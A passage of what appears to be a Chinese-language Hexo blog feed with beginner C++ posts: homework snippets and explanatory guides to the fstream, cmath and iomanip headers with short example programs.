class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;闰年&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;不是&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h1 id="根据输入三角形的三条边长，计算并显示三角形的面积。"><a href="#根据输入三角形的三条边长，计算并显示三角形的面积。" class="headerlink" title="根据输入三角形的三条边长，计算并显示三角形的面积。"></a>根据输入三角形的三条边长，计算并显示三角形的面积。</h1><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">double</span> a,b,c;</span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line">    <span class="type">double</span> m=(a+b+c)/<span class="number">2.0</span>;</span><br><span class="line">    <span class="type">double</span> s=<span class="built_in">sqrt</span>(m*(m-a)*(m-b)*(m-c));</span><br><span class="line">    cout&lt;&lt;s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>水个帖子。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    <category term="homework" scheme="http://example.com/categories/c-c/homework/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>fstream头文件</title>
    <link href="http://example.com/2024/10/22/c%E2%81%84c++/fstream%E8%AF%B4%E6%98%8E/"/>
    <id>http://example.com/2024/10/22/c%E2%81%84c++/fstream%E8%AF%B4%E6%98%8E/</id>
    <published>2024-10-22T11:30:53.000Z</published>
    <updated>2024-11-07T08:34:21.252Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><code>fstream</code> 是 C++ 标准库中的一个类，它用于文件的输入输出操作。<code>fstream</code> 继承自 <code>istream</code> 和 <code>ostream</code> 类，因此它既可以用于读取文件，也可以用于写入文件。以下是关于 <code>fstream</code> 的详细解释：</p><h3 id="一、fstream-的功能"><a href="#一、fstream-的功能" class="headerlink" title="一、fstream 的功能"></a>一、<code>fstream</code> 的功能</h3><p><code>fstream</code> 类提供了对文件进行读写操作的功能。通过创建 <code>fstream</code> 类的对象，并调用其成员函数，可以方便地打开文件、读取文件内容、向文件写入数据，以及关闭文件。</p><h3 id="二、fstream-的成员函数"><a href="#二、fstream-的成员函数" class="headerlink" title="二、fstream 的成员函数"></a>二、<code>fstream</code> 的成员函数</h3><p><code>fstream</code> 类继承了许多来自 <code>istream</code> 和 <code>ostream</code> 类的成员函数，这些函数用于文件的读写操作。以下是一些常用的成员函数：</p><ol><li>**open()**：打开文件。该函数接受文件名和打开模式作为参数，并返回一个布尔值，表示文件是否成功打开。</li><li>**close()**：关闭文件。关闭文件后，将释放与文件相关的资源，并且无法再进行读写操作。</li><li>**is_open()**：检查文件是否已打开。如果文件已打开，则返回 <code>true</code>；否则返回 <code>false</code>。</li><li>**read()**：从文件中读取数据。该函数接受一个字符数组和要读取的字符数作为参数，并将读取的数据存储在数组中。</li><li>**write()**：向文件中写入数据。该函数接受一个字符数组和要写入的字符数作为参数，并将数组中的数据写入文件。</li><li><strong>seekg()</strong> 和 **seekp()**：定位文件指针。<code>seekg()</code> 用于定位输入文件指针，而 <code>seekp()</code> 用于定位输出文件指针。这两个函数可以接受一个长整型值和一个可选的查找方向作为参数。</li></ol><h3 id="三、fstream-的打开模式"><a href="#三、fstream-的打开模式" class="headerlink" title="三、fstream 的打开模式"></a>三、<code>fstream</code> 的打开模式</h3><ol><li><strong>ios::in</strong>：以读取模式打开文件。如果文件不存在，则打开操作将失败。</li><li><strong>ios::out</strong>：以写入模式打开文件。如果文件不存在，则会创建该文件；如果文件已存在，则会清空其内容。</li><li><strong>ios::ate</strong>：打开文件后，将文件指针定位到文件末尾。这通常用于在写入数据时追加到文件末尾。</li><li><strong>ios::app</strong>：以追加模式打开文件。所有写入的数据都将添加到文件末尾，而不会覆盖现有内容。</li><li><strong>ios::trunc</strong>：如果文件已存在，则在打开文件之前清空其内容。这通常与 <code>ios::out</code> 模式一起使用。</li><li><strong>ios::binary</strong>：以二进制模式打开文件。在二进制模式下，文件内容将按原样读写，不进行任何转换。</li></ol><h3 id="四、使用示例"><a href="#四、使用示例" class="headerlink" title="四、使用示例"></a>四、使用示例</h3><p>以下是一个简单的示例，演示如何使用 <code>fstream</code> 类进行文件的读写操作：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建 fstream 对象</span></span><br><span class="line">    std::fstream file;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开文件进行写入操作</span></span><br><span class="line">    file.<span class="built_in">open</span>(<span class="string">&quot;example.txt&quot;</span>, std::ios::out);</span><br><span class="line">    <span class="keyword">if</span> (!file.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to open file for writing&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向文件写入数据</span></span><br><span class="line">    file &lt;&lt; <span class="string">&quot;Hello, World!\n&quot;</span>;</span><br><span class="line">    file.<span class="built_in">close</span>(); <span class="comment">// 关闭文件</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开文件进行读取操作</span></span><br><span class="line">    file.<span class="built_in">open</span>(<span class="string">&quot;example.txt&quot;</span>, std::ios::in);</span><br><span class="line">    <span class="keyword">if</span> (!file.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to open file for reading&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从文件读取数据</span></span><br><span class="line">    std::string line;</span><br><span class="line">    <span class="keyword">if</span> (std::<span class="built_in">getline</span>(file, line)) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Read from file: &quot;</span> &lt;&lt; line &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file.<span class="built_in">close</span>(); <span class="comment">// 关闭文件</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在这个示例中，我们首先创建了一个 <code>fstream</code> 对象，并使用 <code>open()</code> 函数以写入模式打开了一个名为 <code>example.txt</code> 的文件。然后，我们向文件中写入了一条消息，并关闭了文件。接下来，我们再次打开该文件，这次是以读取模式打开的。我们使用 <code>std::getline()</code> 函数从文件中读取了一行数据，并将其打印到标准输出上。最后，我们关闭了文件。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    <category term="c/c++头文件" scheme="http://example.com/categories/c-c/c-c-%E5%A4%B4%E6%96%87%E4%BB%B6/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>cmath头文件</title>
    <link href="http://example.com/2024/10/19/c%E2%81%84c++/cmath%E8%AF%B4%E6%98%8E/"/>
    <id>http://example.com/2024/10/19/c%E2%81%84c++/cmath%E8%AF%B4%E6%98%8E/</id>
    <published>2024-10-19T20:27:53.000Z</published>
    <updated>2024-11-07T08:34:21.252Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><code>cmath</code> 是 C++ 标准库中的一个数学库，它提供了一系列用于执行数学运算的函数。这些函数大多是从 C 语言中的 <code>math.h</code> 头文件继承过来的，但 <code>cmath</code> 是 C++ 风格的封装，所有的函数都位于 <code>std</code> 命名空间中。以下是对 <code>cmath</code> 库的一些主要功能的讲解：</p><h3 id="引入库"><a href="#引入库" class="headerlink" title="引入库"></a>引入库</h3><p>要使用 <code>cmath</code> 库中的函数，你需要在你的 C++ 文件中包含这个头文件：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br></pre></td></tr></table></figure></div><p>并且，由于 <code>cmath</code> 中的函数都在 <code>std</code> 命名空间中，你可能需要在使用这些函数时加上 <code>std::</code> 前缀，或者使用 <code>using namespace std;</code> 来避免重复书写。</p><h3 id="基本数学函数"><a href="#基本数学函数" class="headerlink" title="基本数学函数"></a>基本数学函数</h3><h4 id="幂和对数函数"><a href="#幂和对数函数" class="headerlink" title="幂和对数函数"></a>幂和对数函数</h4><ul><li><code>std::pow(base, exponent)</code>：计算 <code>base</code> 的 <code>exponent</code> 次幂。</li><li><code>std::sqrt(x)</code>：计算 <code>x</code> 的平方根。</li><li><code>std::log(x)</code>：计算 <code>x</code> 的自然对数（以 e 为底）。</li><li><code>std::log10(x)</code>：计算 <code>x</code> 的以 10 为底的对数。</li></ul><h4 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h4><ul><li><code>std::sin(x)</code>：计算 <code>x</code>（以弧度为单位）的正弦值。</li><li><code>std::cos(x)</code>：计算 <code>x</code>（以弧度为单位）的余弦值。</li><li><code>std::tan(x)</code>：计算 <code>x</code>（以弧度为单位）的正切值。</li><li><code>std::asin(x)</code>：计算 <code>x</code> 的反正弦值（返回弧度）。</li><li><code>std::acos(x)</code>：计算 <code>x</code> 的反余弦值（返回弧度）。</li><li><code>std::atan(x)</code>：计算 <code>x</code> 的反正切值（返回弧度）。</li><li><code>std::atan2(y, x)</code>：计算点 <code>(x, y)</code> 的极坐标角度（返回弧度），考虑了所有四个象限。</li></ul><h4 id="指数和对数函数（底数不为-e）"><a href="#指数和对数函数（底数不为-e）" class="headerlink" title="指数和对数函数（底数不为 e）"></a>指数和对数函数（底数不为 e）</h4><ul><li><code>std::exp(x)</code>：计算 e 的 <code>x</code> 次幂。</li><li><code>std::logb(x)</code>：计算 <code>x</code> 的以 2 为底的指数部分（即 <code>log2(x)</code> 的整数部分）。</li><li><code>std::ilogb(x)</code>：计算 <code>x</code> 的以 2 为底的指数部分（整数返回）。</li><li><code>std::scalbn(x, n)</code>：计算 <code>x * (2^n)</code>。</li><li><code>std::scalbnf(x, n)</code>：<code>scalbn</code> 的单精度浮点版本。</li><li><code>std::scalbnl(x, n)</code>：<code>scalbn</code> 的长双精度浮点版本。</li></ul><h4 id="浮点数的取整和舍入"><a href="#浮点数的取整和舍入" class="headerlink" title="浮点数的取整和舍入"></a>浮点数的取整和舍入</h4><ul><li><code>std::ceil(x)</code>：向上取整，返回大于或等于 <code>x</code> 的最小整数。</li><li><code>std::floor(x)</code>：向下取整，返回小于或等于 <code>x</code> 的最大整数。</li><li><code>std::round(x)</code>：四舍五入到最近的整数。</li><li><code>std::trunc(x)</code>：丢弃 <code>x</code> 的小数部分，返回其整数部分。</li><li><code>std::fmod(x, y)</code>：计算 <code>x</code> 除以 <code>y</code> 的余数，结果有相同的符号作为 <code>x</code>。</li><li><code>std::remainder(x, y)</code>：计算 <code>x</code> 除以 <code>y</code> 的 IEEE 754 余数。</li></ul><h4 id="绝对值和其他函数"><a href="#绝对值和其他函数" class="headerlink" title="绝对值和其他函数"></a>绝对值和其他函数</h4><ul><li><code>std::abs(x)</code>：计算 <code>x</code> 的绝对值。对于整数和浮点数有不同的重载版本。</li><li><code>std::fabs(x)</code>：计算浮点数 <code>x</code> 的绝对值（<code>std::abs</code> 的浮点版本）。</li><li><code>std::signbit(x)</code>：检查 <code>x</code> 的符号位是否设置（即是否为负数）。</li><li><code>std::copysign(x, y)</code>：返回一个与 <code>y</code> 有相同符号的 <code>x</code> 的值。</li></ul><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>大多数 <code>cmath</code> 函数都会处理其参数范围内的有效值，但对于某些边界情况（如除以零、取负数的平方根等），这些函数可能会返回特定的值（如 <code>std::nan</code> 或 <code>std::inf</code>）或抛出异常。</li><li>使用 <code>cmath</code> 函数时，请注意它们的参数类型（整数还是浮点数），因为不同的类型可能对应不同的重载版本。</li><li>对于涉及浮点数运算的精度问题，要特别小心，因为浮点运算可能会受到计算机表示法的限制。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    <category term="c/c++头文件" scheme="http://example.com/categories/c-c/c-c-%E5%A4%B4%E6%96%87%E4%BB%B6/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>iomanip头文件</title>
    <link href="http://example.com/2024/10/15/c%E2%81%84c++/iomanip%E8%AF%B4%E6%98%8E/"/>
    <id>http://example.com/2024/10/15/c%E2%81%84c++/iomanip%E8%AF%B4%E6%98%8E/</id>
    <published>2024-10-15T11:30:53.000Z</published>
    <updated>2024-11-07T08:34:21.252Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><code>iomanip</code> 是 C++ 标准库中的一个头文件，它提供了一系列用于格式化输入输出的操纵器（manipulators）。这些操纵器允许你控制浮点数的精度、整数的格式、填充字符、宽度等。以下是一些常用的 <code>iomanip</code> 操纵器及其用法：</p><h3 id="1-setprecision"><a href="#1-setprecision" class="headerlink" title="1. setprecision"></a>1. <code>setprecision</code></h3><p>用于设置浮点数的显示精度（总有效数字位数或小数点后的位数，具体取决于 <code>fixed</code> 或 <code>scientific</code> 操纵器）。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> num = <span class="number">123.456789</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Default precision: &quot;</span> &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Precision 3: &quot;</span> &lt;&lt; std::<span class="built_in">setprecision</span>(<span class="number">3</span>) &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Precision 5: &quot;</span> &lt;&lt; std::<span class="built_in">setprecision</span>(<span class="number">5</span>) &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="2-fixed-和-scientific"><a href="#2-fixed-和-scientific" class="headerlink" title="2. fixed 和 scientific"></a>2. <code>fixed</code> 和 <code>scientific</code></h3><p><code>fixed</code> 使得浮点数以定点表示法显示（即总是显示小数点），而 <code>scientific</code> 以科学计数法显示。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> num = <span class="number">123.456789</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Default: &quot;</span> &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Fixed: &quot;</span> &lt;&lt; std::fixed &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Scientific: &quot;</span> &lt;&lt; std::scientific &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="3-setw"><a href="#3-setw" class="headerlink" title="3. setw"></a>3. <code>setw</code></h3><p>用于设置下一个输出字段的宽度。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">42</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Default width: &quot;</span> &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Width 10: &quot;</span> &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">10</span>) &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="4-setfill"><a href="#4-setfill" class="headerlink" title="4. setfill"></a>4. <code>setfill</code></h3><p>用于设置填充字符，通常与 <code>setw</code> 一起使用。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">42</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Default fill: &quot;</span> &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">10</span>) &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Fill with &#x27;*&#x27;: &quot;</span> &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;*&#x27;</span>) &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">10</span>) &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="5-left-right-internal"><a href="#5-left-right-internal" class="headerlink" title="5. left, right, internal"></a>5. <code>left</code>, <code>right</code>, <code>internal</code></h3><p>用于设置字段的对齐方式。<code>left</code> 左对齐，<code>right</code> 右对齐，<code>internal</code> 使得填充字符在符号和数字之间（主要用于科学计数法）。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> num = <span class="number">-123.456</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Default align: &quot;</span> &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">15</span>) &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Left align: &quot;</span> &lt;&lt; std::left &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">15</span>) &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Right align: &quot;</span> &lt;&lt; std::right &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">15</span>) &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Internal align (scientific): &quot;</span> &lt;&lt; std::scientific &lt;&lt; std::internal &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">15</span>) &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="6-boolalpha-和-noboolalpha"><a href="#6-boolalpha-和-noboolalpha" class="headerlink" title="6. boolalpha 和 noboolalpha"></a>6. <code>boolalpha</code> 和 <code>noboolalpha</code></h3><p>用于控制布尔值的输出格式。<code>boolalpha</code> 使布尔值以 <code>true</code> 或 <code>false</code> 输出，而 <code>noboolalpha</code> 使其以 <code>1</code> 或 <code>0</code> 输出。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Default bool: &quot;</span> &lt;&lt; flag &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Boolalpha: &quot;</span> &lt;&lt; std::boolalpha &lt;&lt; flag &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Noboolalpha: &quot;</span> &lt;&lt; std::noboolalpha &lt;&lt; flag &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="7-showbase-和-noshowbase"><a href="#7-showbase-和-noshowbase" class="headerlink" title="7. showbase 和 noshowbase"></a>7. <code>showbase</code> 和 <code>noshowbase</code></h3><p>用于控制是否显示数值的基数前缀（如八进制的 <code>0</code>，十六进制的 <code>0x</code>）。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">255</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Default base: &quot;</span> &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Hexadecimal with showbase: &quot;</span> &lt;&lt; std::hex &lt;&lt; std::showbase &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Hexadecimal without showbase: &quot;</span> &lt;&lt; std::hex &lt;&lt; std::noshowbase &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="8-uppercase-和-nouppercase"><a href="#8-uppercase-和-nouppercase" class="headerlink" title="8. uppercase 和 nouppercase"></a>8. <code>uppercase</code> 和 <code>nouppercase</code></h3><p>用于控制十六进制和八进制数值的输出是否使用大写字母。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">255</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Default hex: &quot;</span> &lt;&lt; std::hex &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Uppercase hex: &quot;</span> &lt;&lt; std::hex &lt;&lt; std::uppercase &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Lowercase hex: &quot;</span> &lt;&lt; std::hex &lt;&lt; std::nouppercase &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这些操纵器可以通过组合使用，以满足各种格式化需求。记住，操纵器通常只对下一个输出操作有效，除非显式地重置。</p><hr><p>在C++中，如果你想要为整个程序或某个特定作用域内的输出设置统一的格式，你可以通过修改流对象（如<code>std::cout</code>）的格式状态来实现。这些修改通常是临时的，除非你显式地保存并恢复这些状态，或者使用某些全局设置方法（尽管C++标准库并不直接提供全局设置所有输出的方法）。</p><p>以下是一些控制输出格式的方法，这些方法可以在一定程度上实现全局或持久化的效果：</p><ol><li><p><strong>使用<code>std::ios_base</code>的静态成员函数</strong>：<br>虽然<code>std::ios_base</code>提供了设置和获取格式状态的静态成员函数（如<code>sync_with_stdio</code>），但它们并不直接用于格式化输出。这些函数主要用于控制C++流与C标准I&#x2F;O库之间的同步。</p></li><li><p><strong>创建自定义的流对象</strong>：<br>你可以创建一个自定义的流对象，并设置其格式状态。然后，在你的程序中使用这个自定义的流对象进行输出。这种方法的好处是你可以在不同的作用域或模块中轻松地重用这些设置。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line">std::ostream&amp; my_cout = std::cout; <span class="comment">// 实际上，这里只是引用了std::cout</span></span><br><span class="line"><span class="comment">// 或者，你可以创建一个stringstream或其他ostream派生类的对象</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 设置自定义流的格式状态</span></span><br><span class="line">    my_cout &lt;&lt; std::fixed &lt;&lt; std::<span class="built_in">setprecision</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用自定义流进行输出</span></span><br><span class="line">    <span class="type">double</span> num = <span class="number">123.456789</span>;</span><br><span class="line">    my_cout &lt;&lt; <span class="string">&quot;Formatted output: &quot;</span> &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注意：这里my_cout实际上是std::cout的引用，所以它的设置会影响到std::cout</span></span><br><span class="line">    <span class="comment">// 如果你不想影响std::cout，应该创建一个独立的ostream对象</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><strong>注意</strong>：在上面的例子中，<code>my_cout</code>实际上是<code>std::cout</code>的引用，所以对它所做的任何修改都会影响到<code>std::cout</code>。如果你想要一个独立的流对象，你应该创建一个<code>std::ostringstream</code>或其他<code>std::ostream</code>派生类的对象。</p></li><li><p><strong>使用函数封装格式设置</strong>：<br>你可以编写一个函数，该函数接受一个流对象和必要的格式参数，并设置流对象的格式状态。然后，在你的程序中调用这个函数来设置输出格式。</p><div 